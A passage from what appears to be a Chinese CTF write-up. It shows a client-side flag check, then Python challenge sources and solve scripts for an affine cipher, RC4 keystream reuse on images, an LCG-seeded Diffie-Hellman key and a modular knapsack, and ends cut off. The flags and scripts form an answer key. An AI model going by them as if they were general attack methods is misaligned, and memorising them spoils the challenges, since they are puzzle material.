Draw(ctx,circleArr,pwdArr,<span class="keyword">null</span>);</span><br><span class="line">     <span class="comment">// alert("密码结果是："+pwdArr.join(""));</span></span><br><span class="line">     res = pwdArr.join(<span class="string">""</span>)</span><br><span class="line">     <span class="keyword">if</span>(res==<span class="string">"723048561"</span>)&#123;</span><br><span class="line">       alert(<span class="string">"flag&#123;c967db67a5e32fef9049499daadc19e8&#125;"</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       location.reload();</span><br><span class="line">     &#125;</span><br><span class="line">     res = <span class="string">""</span></span><br><span class="line">     pwdArr=[];</span><br><span class="line">   &#125;, <span class="keyword">false</span>);</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>得到flagCrypto</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> A,SALT</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, a, si)</span>:</span></span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line">        c+=hex(((ord(m[i])) * a + ord(next(si))) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    m = <span class="string">'flag&#123;********************************&#125;'</span></span><br><span class="line">    a = A</span><br><span class="line">    salt = SALT</span><br><span class="line">    <span class="keyword">assert</span>(len(salt)==<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span>(salt.isalpha())</span><br><span class="line">    si = cycle(salt.lower())</span><br><span class="line">    print(<span class="string">"明文内容为："</span>)</span><br><span class="line">    print(m)</span><br><span class="line">    print(<span class="string">"加密后的密文为："</span>)</span><br><span class="line">    c=encrypt(m, a, si)</span><br><span class="line">    print(c)</span><br><span class="line">    <span class="comment">#加密后的密文为：</span></span><br><span class="line">    <span class="comment">#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d</span></span><br></pre></td></tr></table></figure><p>是一个简单的仿射密码，c = ax+salt（mod 128）</p><p>其中a固定未知，salt是变化的，但是周期只有3</p><p>我们知道flag的格式，开头为flag</p><p>所以我们拿‘f’和‘g’来解方程，此时两个未知数，两条方程，完全可解。</p><p>解出a后，再用flag的‘l’和‘a’来解salt的另外两个值</p><p>最终解出a = 57,  salt = ‘ahh’</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="string">'177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">m = <span class="string">'flag'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c[0] = ord('f')*a + b</span></span><br><span class="line"><span class="comment">#c[3] = ord('g')*a + b</span></span><br><span class="line">a=<span class="number">57</span></span><br><span class="line">b1 = (<span class="number">0x17</span>-ord(<span class="string">'f'</span>)*a)%<span class="number">128</span></span><br><span class="line">b2 = (<span class="number">0x74</span>-ord(<span class="string">'l'</span>)*a)%<span class="number">128</span></span><br><span class="line">b3 = (<span class="number">0x01</span>-ord(<span class="string">'a'</span>)*a)%<span class="number">128</span></span><br><span class="line"></span><br><span class="line">salt=<span class="string">'ahh'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">index=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    b = ord(salt[index%<span class="number">3</span>])</span><br><span class="line">    index+=<span class="number">1</span></span><br><span class="line">    flag+=chr((ord(i)-b)*inverse(a,<span class="number">128</span>)%<span class="number">128</span>)</span><br></pre></td></tr></table></figure><h3 id="Encrypt-Img"><a href="#Encrypt-Img" class="headerlink" title="Encrypt_Img"></a>Encrypt_Img</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> Key</span><br><span class="line"></span><br><span class="line">Plaintext1 = <span class="string">"RC4IsInteresting"</span></span><br><span class="line">Plaintext2 = <span class="string">"ThisIsAEasyGame"</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Key)</span>:</span></span><br><span class="line">        self.S = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        self.K = [ord(Key[i % len(Key)])*<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        self.I, self.J = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        self.KSA()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">KSA</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            j = (i+self.K[i]+self.S[i]) % <span class="number">256</span></span><br><span class="line">            self.S[i], self.S[j] = self.S[j], self.S[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.I = (self.I+<span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        self.J = (self.J+self.S[self.I]) % <span class="number">256</span></span><br><span class="line">        self.S[self.J], self.S[self.I] = self.S[self.I], self.S[self.J]</span><br><span class="line">        tmp = (self.S[self.J] + self.S[self.I]) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">return</span> self.S[tmp]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Encrypt</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, plain)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> cnt</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        self.rc4 = RC4(Key)</span><br><span class="line">        self.testRC4(plain)</span><br><span class="line">        flag_file = Image.open(<span class="string">r"flag.png"</span>)</span><br><span class="line">        img = array(flag_file)</span><br><span class="line">        self.enc(img)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">testRC4</span><span class="params">(self, plain)</span>:</span></span><br><span class="line">        ciphertext = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">            ciphertext = (ciphertext &lt;&lt; <span class="number">8</span>)+ord(i) ^ self.rc4.next()</span><br><span class="line">        print(<span class="string">"ciphertext&#123;&#125; = &#123;&#125;"</span>.format(cnt, ciphertext))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(self, img)</span>:</span></span><br><span class="line">        a, b, _ = img.shape</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">                pixel = img[x, y]</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                    pixel[i] = pixel[i] ^ self.rc4.next()</span><br><span class="line">                img[x][y] = pixel</span><br><span class="line">        enc = Image.fromarray(img)</span><br><span class="line">        enc.save(<span class="string">"enc&#123;&#125;.png"</span>.format(cnt))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Encrypt(Plaintext1)</span><br><span class="line">Encrypt(Plaintext2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ciphertext1 = 12078640933356268898100798377710191641</span></span><br><span class="line"><span class="comment"># ciphertext2 = 79124196547094980420644350061749775</span></span><br></pre></td></tr></table></figure><p>题目用的流密码是一个标准RC4。我们可以看到题目加密了Plaintext1和flag的图片，然后又加密了Plaintext2和flag的图片。</p><p>这一题的切入点在题目所作的两次test。我们可以看到Plaintext1和Plaintext1相差了一个字节。然后两次加密用的是同样的key，这也就意味着两次用于加密明文的密钥流是一模一样的。所以加密两次图片的密钥流刚好有一位的错位。</p><p>鉴于RC4加密的特性，当我们有一对明文、密文我们是可以知道密钥的。然后我们可以利用Plaintext2多出来的那一个字节来知道第一次加密图片的第一位密钥。然后用这个密钥去解密，得到第一次加密的图片的第一个像素点。有了图片的原始的第一个像素点，我们也有第二次加密的图片加密后的像素点，利用这两个点我们能获得第一次加密图片的第二个key。如此循环往复，来回横跳，就可以最终恢复第一次加密的图片</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">"g"</span></span><br><span class="line">P2 = <span class="string">""</span></span><br><span class="line">c1=<span class="number">0x19</span></span><br><span class="line">c2=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">k1 = ord(p1)^c1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_file1 = Image.open(<span class="string">r"enc1.png"</span>)</span><br><span class="line">flag_file2 = Image.open(<span class="string">r"enc2.png"</span>)</span><br><span class="line">img1 = array(flag_file1)</span><br><span class="line">img2 = array(flag_file2)</span><br><span class="line">a, b, _ = img1.shape</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">        pixel1 = img1[x, y]</span><br><span class="line">        pixel2 = img2[x, y]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">            pixel2[i] = pixel2[i] ^ k1</span><br><span class="line">            k1 = pixel2[i]^pixel1[i]</span><br><span class="line">        img2[x][y] = pixel2</span><br><span class="line">enc2 = Image.fromarray(img2)</span><br><span class="line"></span><br><span class="line">enc2.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><p>得到图片</p><p><img src="https://i.loli.net/2020/05/23/P3w6brGjcXdxqK1.png" alt></p><h3 id="easyLCG"><a href="#easyLCG" class="headerlink" title="easyLCG"></a>easyLCG</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.a = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.b = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.seed = (self.a*self.seed+self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;"</span>.format(self.a, self.b, self.m))</span><br><span class="line">        print(<span class="string">"state1 = &#123;&#125;"</span>.format(self.next()))</span><br><span class="line">        print(<span class="string">"state2 = &#123;&#125;"</span>.format(self.next()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DH</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.lcg = LCG()</span><br><span class="line">        self.lcg.output()</span><br><span class="line">        self.g = getRandomNBitInteger(<span class="number">128</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">256</span>)</span><br><span class="line">        self.A, self.a = self.gen_AB()</span><br><span class="line">        self.B, self.b = self.gen_AB()</span><br><span class="line">        self.key = pow(self.A, self.b, self.m)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_AB</span><span class="params">(self)</span>:</span></span><br><span class="line">        x = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            x += <span class="string">'1'</span> <span class="keyword">if</span> self.lcg.next() % <span class="number">2</span> <span class="keyword">else</span> <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">return</span> pow(self.g, int(x, <span class="number">2</span>), self.m), int(x, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DH = DH()</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">print(<span class="string">"g = &#123;&#125;\nA = &#123;&#125;\nB = &#123;&#125;\nM = &#123;&#125;"</span>.format(DH.g, DH.A, DH.B, DH.m))</span><br><span class="line">print(<span class="string">"Cipher = &#123;&#125;"</span>.format(flag ^ DH.key))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a = 3844066521</span></span><br><span class="line"><span class="string">b = 3316005024</span></span><br><span class="line"><span class="string">m = 2249804527</span></span><br><span class="line"><span class="string">state1 = 16269</span></span><br><span class="line"><span class="string">state2 = 4249</span></span><br><span class="line"><span class="string">g = 183096451267674849541594370111199688704</span></span><br><span class="line"><span class="string">A = 102248652770540219619953045171664636108622486775480799200725530949685509093530</span></span><br><span class="line"><span class="string">B = 74913924633988481450801262607456437193056607965094613549273335198280176291445</span></span><br><span class="line"><span class="string">M = 102752586316294557951738800745394456033378966059875498971396396583576430992701</span></span><br><span class="line"><span class="string">Cipher = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>这一道题两个知识点，一个是LCG，一个是DHP，其中，DHP用于加密flag，我们要得到flag就要获得协商密钥。而获得协商密钥的方法就是知道一方的私钥。而双方的私钥使用LCG生成的。</p><p>LCG中的三个参数a,b,m我们都知道。然后给出了s1 和 s2 的高位。低16位未知。这里完全可以爆破。</p><p>爆破s1，然后生成s2，看高位是否与给出的s2高位一致来确定。最终爆出四个符合的值。</p><p>然后就利用四个可能的s2和a, b, m，根据题目生成密钥的方式来生成A的四个可能私钥。再利用B的公钥获得四个协商密钥。然后看解密结果，找出flag。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">3844066521</span></span><br><span class="line">b = <span class="number">3316005024</span></span><br><span class="line">m = <span class="number">2249804527</span></span><br><span class="line">state1 = <span class="number">16269</span></span><br><span class="line">state2 = <span class="number">4249</span></span><br><span class="line">M = <span class="number">102752586316294557951738800745394456033378966059875498971396396583576430992701</span></span><br><span class="line">B = <span class="number">74913924633988481450801262607456437193056607965094613549273335198280176291445</span></span><br><span class="line">A = <span class="number">102248652770540219619953045171664636108622486775480799200725530949685509093530</span></span><br><span class="line">c = <span class="number">13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    s = state1&lt;&lt;<span class="number">16</span></span><br><span class="line">    s+=i</span><br><span class="line">    <span class="keyword">if</span> ((a*s+b)%m)&gt;&gt;<span class="number">16</span> == <span class="number">4249</span>:</span><br><span class="line">        s2 = (a*s+b)%m</span><br><span class="line">        <span class="keyword">print</span> s2</span><br><span class="line">        x=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            s2 = (a*s2+b)%m</span><br><span class="line">            x += <span class="string">'1'</span> <span class="keyword">if</span> (s2&gt;&gt;<span class="number">16</span>) % <span class="number">2</span> <span class="keyword">else</span> <span class="string">'0'</span></span><br><span class="line">        x = int(x,<span class="number">2</span>)</span><br><span class="line">        key = pow(B,x,M)</span><br><span class="line">        flag = key^c</span><br><span class="line">        <span class="keyword">print</span> long_to_bytes(flag)</span><br></pre></td></tr></table></figure><h3 id="knapsack"><a href="#knapsack" class="headerlink" title="knapsack"></a>knapsack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genKey</span><span class="params">(length)</span>:</span></span><br><span class="line">    A, B = getPrime(<span class="number">64</span>), getPrime(<span class="number">1025</span>)</span><br><span class="line"></span><br><span class="line">    Rn = getPrime(<span class="number">1024</span>)</span><br><span class="line">    key1 = [Rn//<span class="number">2</span>**i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length+<span class="number">1</span>)]</span><br><span class="line">    key2 = [i*A % B <span class="keyword">for</span> i <span class="keyword">in</span> key1]</span><br><span class="line">    <span class="keyword">return</span> key1,key2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text,key)</span>:</span></span><br><span class="line">    Sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">        Sum+=int(text[i])*key[i]</span><br><span class="line">    <span class="keyword">return</span> Sum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(Ciper,Key)</span>:</span></span><br><span class="line">    f1=open(<span class="string">"pub.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Key)):</span><br><span class="line">        f1.write(str(Key[i])+<span class="string">'\n'</span>)</span><br><span class="line">    f2=open(<span class="string">"cip.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    f2.write(hex(Ciper))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FLAG = bin(bytes_to_long(flag.encode()))[<span class="number">2</span>:]</span><br><span class="line">Key1,Key2 = genKey(len(FLAG))</span><br><span class="line">Ciper = encrypt(FLAG,Key1)</span><br><span class="line">save(Ciper,Key2)</span><br></pre></td></tr></table></figure><p>这是一个超递增背包问题。但这里用的是一个超递减序列</p><p>并且对这个序列做了一次加密，加密方式为 a*A % B，其中x为序列中的每一个元素，B大于序列中最大的元素。</p><p>想要解密，我们首先需要获得A和B，然后来通过求逆来获得原序列。</p><p>获得A的方式很简单。这个序列的最小的值很小，这个时候用不到模运算，我们只需要对比较小的两个值求一个最大公因数就能得到A。</p><p>至于求B，我们找到比较大的两个数，并且满足如下关系，即$a_{i+1} &lt; a_{i}$，（我们设最小的为$a_0$）这是不符合序列的单调性的，也就意味着这里存在一次模运算。且这里的递减是用整除2来得到的。所以要么$a_{i}\cdot 2 - a_{i+1} = B$，要么$a_{i}\cdot 2 + A - a_{i+1} = B$ 【因为这里是整除嘛，这不难理解】</p><p>有了原来的超递减序列，这个问题就很简单了。我们只需要对这个序列从头开始判断。如果密文大于这个元素，flag的最高位bit就是1，然后将密文减去这个元素。否则flag的这一个bit位就是0，继续下一个元素与密文的大小判断。如此循环。最后解密得到flag。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">b=<span class="number">335428611041311731398614259824482604248524861615176787429946575184146370361110652887115402376826444538743339055691850202034085349274540292019392290484025358504275054761608502214481606484088807087063751542648223811793597463026662881020647708165593980984857948283181770647446888695205803952635117800114545071259</span></span><br><span class="line">a=<span class="number">11243098275181678343</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"pub.txt"</span>)<span class="keyword">as</span> f:</span><br><span class="line">    data=f.read()</span><br><span class="line"></span><br><span class="line">data=data.split(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">datai=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    datai.append(int(i))</span><br><span class="line">dataii=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> datai:</span><br><span class="line">    dataii.append(i*inverse(a,b)%b)</span><br><span class="line"></span><br><span class="line">c=<span class="number">0x8ab3086a3df540d4652c191951756a6574aca491d933e479330532f0586ce03862f82f36dea8038b8bfb0b394331d7a93050efa2a26e46d9d8ca394600456cd79e02890a2c31b02e920c28a9f27c3943ec68fe5555ff4056358f35869859d67d67702edf44b10a7690acbaeea1f4def46392922069bfb71c173a210e9ab384f7</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dataii:</span><br><span class="line">    <span class="keyword">if</span> c&gt;=i:</span><br><span class="line">        flag+=<span class="string">'1'</span></span><br><span class="line">        c-=i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="string">'0'</span></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(int(flag,<span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="Backpacker"><a href="#Backpacker" class="headerlink" title="Backpacker"></a>Backpacker</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 